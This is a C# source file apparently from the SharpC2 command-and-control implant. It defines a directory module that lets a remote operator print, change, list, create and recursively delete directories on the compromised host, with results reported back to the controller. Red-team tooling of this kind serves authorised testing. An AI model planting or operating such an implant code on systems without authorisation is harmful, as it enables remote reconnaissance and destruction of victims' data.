using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;

using Shared.Models;

using System;
using System.Collections.Generic;
using System.IO;

namespace Agent.Modules
{
    class DirectoryModule : IAgentModule
    {
        AgentController Agent;
        ConfigController Config;

        public void Init(AgentController Agent, ConfigController Config)
        {
            this.Agent = Agent;
            this.Config = Config;
        }

        public ModuleInfo GetModuleInfo()
        {
            return new ModuleInfo
            {
                Name = "Dir",
                Commands = new List<ModuleInfo.Command>
                {
                    new ModuleInfo.Command
                    {
                        Name = "Print",
                        Delegate = PrintWorkingDirectory
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Change",
                        Delegate = ChangeCurrentDirectory
                    },
                    new ModuleInfo.Command
                    {
                        Name = "List",
                        Delegate = ListDirectory
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Remove",
                        Delegate = RemoveDirectory
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Create",
                        Delegate = CreateDirectory
                    }
                }
            };
        }

        void PrintWorkingDirectory(string AgentID, AgentTask Task)
        {
            try
            {
                var result = GetCurrentDirectory;
                Agent.SendMessage(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void ChangeCurrentDirectory(string AgentID, AgentTask Task)
        {
            try
            {
                var path = (string)Task.Parameters["Path"];
                Directory.SetCurrentDirectory(path);

                var result = GetCurrentDirectory;
                Agent.SendMessage(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void ListDirectory(string AgentID, AgentTask Task)
        {
            try
            {
                var path = Task.Parameters["Path"];
                
                if (path == null)
                {
                    path = GetCurrentDirectory;
                }

                var result = new SharpC2ResultList<FileSystemEntryResult>();

                foreach (var directory in Directory.GetDirectories((string)path))
                {
                    var info = new DirectoryInfo(directory);
                    result.Add(new FileSystemEntryResult
                    {
                        Size = string.Empty,
                        Type = "dir",
                        LastModified = info.LastWriteTimeUtc,
                        Name = info.Name
                    });
                }

                foreach (var file in Directory.GetFiles((string)path))
                {
                    var info = new FileInfo(file);
                    result.Add(new FileSystemEntryResult
                    {
                        Size = Helpers.ConvertFileLength(info.Length),
                        Type = "fil",
                        LastModified = info.LastWriteTimeUtc,
                        Name = info.Name
                    });
                }

                Agent.SendMessage(result.ToString());
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void RemoveDirectory(string AgentID, AgentTask Task)
        {
            try
            {
                var directory = (string)Task.Parameters["Path"];
                Directory.Delete(directory, true);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void CreateDirectory(string AgentID, AgentTask Task)
        {
            try
            {
                var path = (string)Task.Parameters["Path"];
                Directory.CreateDirectory(path);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        string GetCurrentDirectory
        {
            get { return Directory.GetCurrentDirectory(); }
        }
    }
}